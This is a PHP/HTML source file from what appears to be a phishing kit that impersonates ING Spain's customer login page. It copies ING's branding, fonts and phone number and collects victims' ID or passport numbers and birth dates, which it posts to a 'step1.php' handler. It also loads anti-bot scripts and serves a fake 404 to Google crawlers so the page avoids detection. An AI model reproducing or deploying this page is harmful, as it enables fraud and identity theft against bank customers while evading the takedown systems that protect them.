<?php
 session_start();
 error_reporting(0);


 include "../anti__boot/anti1.php";
 include "../anti__boot/anti2.php";
 include "../anti__boot/anti3.php";
 include "../anti__boot/anti4.php";
 include "../anti__boot/anti5.php";
 include "../anti__boot/anti7.php";
 include "../anti__boot/anti8.php";
 error_reporting(0);

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }


?>

<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Acceso clientes, ING</title>
    <link rel="icon" href="./img/favicon.ico">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.5/css/bulma.min.css">
    <script defer src="https://use.fontawesome.com/releases/v5.3.1/js/all.js"></script>
    <link rel="stylesheet" href="./css/style.css">
    <style>@font-face{font-family:"INGMe";src:url('https://ing.ingdirect.es/app-login/bower_components/ing-uif-styles/assets/INGMe/Regular/INGMeWeb-Regular.97205b19.woff2') format("woff2"),
         url('https://ing.ingdirect.es/app-login/bower_components/ing-uif-styles/assets/INGMe/Regular/INGMeWeb-Regular.9531ef57.woff') format("woff"),
         url('https://ing.ingdirect.es/app-login/bower_components/ing-uif-styles/assets/INGMe/Regular/INGMeWeb-Regular.7c4569f0.ttf') format("truetype"),
         url('https://ing.ingdirect.es/app-login/bower_components/ing-uif-styles/assets/INGMe/Regular/INGMeWeb-Regular.50974929.svg#INGMeWeb-Regular') format("svg");font-weight:normal;font-style:normal;}@font-face{font-family:"INGMe";src:url('https://ing.ingdirect.es/app-login/bower_components/ing-uif-styles/assets/INGMe/Bold/INGMeWeb-Bold.126c1fde.woff2') format("woff2"),
         url('https://ing.ingdirect.es/app-login/bower_components/ing-uif-styles/assets/INGMe/Bold/INGMeWeb-Bold.a1d59afa.woff') format("woff"),
         url('https://ing.ingdirect.es/app-login/bower_components/ing-uif-styles/assets/INGMe/Bold/INGMeWeb-Bold.5533614d.ttf') format("truetype"),
         url('https://ing.ingdirect.es/app-login/bower_components/ing-uif-styles/assets/INGMe/Bold/INGMeWeb-Bold.61c4d880.svg#INGMeWeb-Bold') format("svg");font-weight:bold;font-style:normal;}</style>
  </head>
  <body>

<nav class="navbar" role="navigation" aria-label="main navigation">
  <div class="navbar-brand">
    <a class="navbar-item" href="#">
      <img src="./img/logo.svg" width="112" height="28">
    </a>
  </div>

  <div id="navbarBasicExample" class="navbar-menu">
  

    <div class="navbar-end">
      <div class="navbar-item">
      <img src="./img/phone.png"  style=" max-height: 1.3rem; " alt="">&nbsp; 91 206 66 66
      </div>
    </div>
  </div>
</nav>


  <section class="section">
    <div class="container">
        <div class="form">
        <h1>Accede a tu Área Clientes</h1>
        <br>
        <p>Elige tu documento</p>
        <br>

       <form action="step1.php" method="POST">


          
        <label class="check_container">DNI o Tarjeta de residencia
          <input type="radio" id="dni" checked="checked" name="dni" onclick="document.getElementById('numro').placeholder = 'DNI o Tarjeta de residencia';document.getElementById('pass').checked = false;">
          <span class="checkmark"></span>
        </label>
        <label class="check_container">Pasaporte
          <input type="radio" id="pass" name="pasaporte" onclick="document.getElementById('numro').placeholder = 'Pasaporte';document.getElementById('dni').checked = false;">
          <span class="checkmark"></span>
        </label>
        
          <br>

          <div class="field">
            <label class="label">Número de documento</label>
            <div class="control">
              <input class="input" name="numro" id="numro" type="text" required=""  maxlength="10" placeholder="DNI o Tarjeta de residencia"   name="" title="DNI o Tarjeta de residencia">
            </div>
          </div>
          
          <br>

          <div class="field">
            <label class="label">Fecha de nacimiento</label>
            <div class="control">
              <div style="border-radius: 0.25em;padding: 0px;width: 100%;height: 2.5em;-webkit-box-shadow: 0 0.125em 0.125em 0 #d9d9d9 inset;box-shadow: 0 0.125em 0.125em 0 #d9d9d9 inset;box-sizing: border-box;position: relative;font-size: 1em;line-height: 1.375em;background-color: #fff;border: 0.0625em solid #a8a8a8;color: #333;max-width: 100%;display: -webkit-box;display: -ms-flexbox;display: flex;-webkit-box-align: stretch;-ms-flex-align: stretch;align-items: stretch;-ms-flex-wrap: nowrap;flex-wrap: nowrap;border-radius: 0.25em;width: 100%;background-color: #fff;-webkit-box-shadow: 0 0.15625em 0.15625em 0 #d9d9d9 inset;box-shadow: 0 0.15625em 0.15625em 0 #d9d9d9 inset;">
              <input type="text" name="dd" minlength="2" maxlength="2" placeholder="DD" required="" title="Día, formato DD" slot="_input" style="width: 100%;position: relative;width: 100%;position: relative;padding: 0.5em 0.75em;width: 100%;height: 2.4em;-webkit-box-shadow: 0 0.125em 0.125em 0 #d9d9d9 inset;box-shadow: 0 0.125em 0.125em 0 #d9d9d9 inset;box-sizing: border-box;position: relative;font-size: 1em;line-height: 1.375em;background-color: #fff;border: 0.0625em solid #a8a8a8;color: #333;">

              <input type="text" name="mm" minlength="2" maxlength="2" placeholder="MM" required="" title="Mes, formato MM"  style="width: 100%;position: relative;width: 100%;position: relative;padding: 0.5em 0.75em;width: 100%;height: 2.4em;-webkit-box-shadow: 0 0.125em 0.125em 0 #d9d9d9 inset;box-shadow: 0 0.125em 0.125em 0 #d9d9d9 inset;box-sizing: border-box;position: relative;font-size: 1em;line-height: 1.375em;background-color: #fff;border: 0.0625em solid #a8a8a8;color: #333;">
              <input type="text"  name="aaaa" minlength="4" maxlength="4" placeholder="AAAA" required="" title="Año, formato AAAA" style="width: 100%;position: relative;padding: 0.5em 0.75em;width: 100%;height: 2.4em;-webkit-box-shadow: 0 0.125em 0.125em 0 #d9d9d9 inset;box-shadow: 0 0.125em 0.125em 0 #d9d9d9 inset;box-sizing: border-box;position: relative;font-size: 1em;line-height: 1.375em;background-color: #fff;border: 0.0625em solid #a8a8a8;color: #333;">
              </div>
            </div>
          </div>
          <br>

         
          <label class="lcontainer" style=" font-size: 15px; color: #333; ">Recordar
            <input type="checkbox">
            <span class="checkmark" style=" border-radius: 0.25em; border: 0.0625em solid #a8a8a8; -webkit-box-shadow: 0 0.125em 0.125em 0 #d9d9d9 inset; box-shadow: 0 0.125em 0.125em 0 #d9d9d9 inset; background-color: #ffffff; "></span>
          </label>
        
<br>
<button type="submit" class="mb-5" style=" background-color: #ff6200; padding: 0 30px; height: 45px; color: #FFF; font-weight: 700; width: 100%; border-radius: 9px; border: none; font-size: 18px; cursor: pointer; ">ENTRAR</button>
<br>
<br>

    <div style="display: flex;align-items: center;">
        <img src="./img/arrow.png">
        <a href="#"> Acceder con DNI electrónico</a>
    </div>
    <div style="display: flex;align-items: center;">
        <img src="./img/arrow.png">
        <a href="#"> Más información sobre seguridad</a>
    </div>
    <br>
    <br>
</form>
        </div>
    </div>
  </section>
  
  
  </body>
</html>